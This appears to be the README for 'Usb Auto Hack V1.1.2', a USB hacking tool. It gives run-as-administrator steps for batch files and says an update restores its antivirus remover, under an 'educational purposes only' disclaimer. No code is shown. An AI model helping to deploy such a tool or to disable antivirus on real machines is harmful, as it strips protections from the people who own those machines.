Usb Auto Hack V1.1.2
	Made by Ross Epstein.
		I am not responisble for anything you do illegal.
		This program is made for legal and educational purposes only!

Until Fixed goto APP folder and run OPTIONS.BAT in ADMINISTRATOR mode for it to work.(right click run as administrator)
	Should be fixed within next update :)
(If you want the extra options if you just want defaults to run just run start.bat as normal)






Whats new:
	- Fixes anti virus remover to work again

	
	
	